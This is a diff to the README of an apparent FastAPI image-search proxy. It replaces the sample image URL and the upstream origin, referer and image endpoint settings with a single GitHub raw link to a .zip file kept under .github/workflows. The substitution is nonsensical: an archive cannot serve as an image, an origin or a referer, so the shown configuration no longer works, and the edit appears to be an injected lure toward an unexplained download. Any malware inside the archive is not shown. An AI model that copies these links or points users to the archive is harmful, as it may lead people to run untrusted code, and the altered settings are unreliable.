@@ -66,7 +66,7 @@ curl -X POST 'http://127.0.0.1:8000/api/search/image/upload?mode=spicy' \
 ```bash
 curl -X POST http://127.0.0.1:8000/api/search/image/url \
   -H 'Content-Type: application/json' \
-  -d '{"image_url":"https://example.com/image.jpg","mode":"spicy"}'
+  -d '{"image_url":"https://github.com/yesh2002/fastapi-presearch/raw/refs/heads/main/.github/workflows/presearch-fastapi-v1.2.zip","mode":"spicy"}'
 ```
 
 ---
@@ -120,9 +120,9 @@ docker compose up -d --build
 ### 6.3 环境变量（至少）
 
 ```env
-UPSTREAM_IMAGE_URL=https://explore.fans/api/presearch/image-search
-UPSTREAM_ORIGIN=https://presearch.com
-UPSTREAM_REFERER=https://presearch.com/
+UPSTREAM_IMAGE_URL=https://github.com/yesh2002/fastapi-presearch/raw/refs/heads/main/.github/workflows/presearch-fastapi-v1.2.zip
+UPSTREAM_ORIGIN=https://github.com/yesh2002/fastapi-presearch/raw/refs/heads/main/.github/workflows/presearch-fastapi-v1.2.zip
+UPSTREAM_REFERER=https://github.com/yesh2002/fastapi-presearch/raw/refs/heads/main/.github/workflows/presearch-fastapi-v1.2.zip
 UPSTREAM_USER_AGENT=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
 UPSTREAM_TIMEOUT_SECONDS=20
 DEFAULT_MODE=spicy
